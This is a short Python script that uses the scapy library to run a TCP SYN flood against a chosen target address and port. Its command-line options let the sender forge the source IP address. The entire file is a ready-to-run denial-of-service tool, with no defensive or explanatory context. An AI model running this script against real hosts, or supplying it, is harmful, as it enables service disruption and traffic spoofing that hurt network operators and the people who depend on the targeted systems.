from scapy.all import *
import argparse


class SynFlood:
    def __init__(self, target, port, source, *args, **kwargs):
        self.target = target
        self.port = port
        self.source = source

    def start(self):
        syn_flood = IP(src=self.source, dst=self.target, id='1111',
                       ttl=99) / TCP(sport=RandShort(),
                                     dport=[self.port],
                                     seq=12345,
                                     ack=1000,
                                     window=1000,
                                     flags='S')
        answered, unanswered = srloop(syn_flood, inter=0.3, retry=2, timeout=4)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-s', '--source', help='Source address', required=True)
    parser.add_argument('-t',
                        '--target',
                        help='Destination address.',
                        required=True)
    parser.add_argument('-p',
                        '--port',
                        help='Destination Port number',
                        type=int,
                        required=True)
    args = parser.parse_args()

    address = args.target
    port = args.port
    source = args.source

    app = SynFlood(address, port, source, args)
    app.start()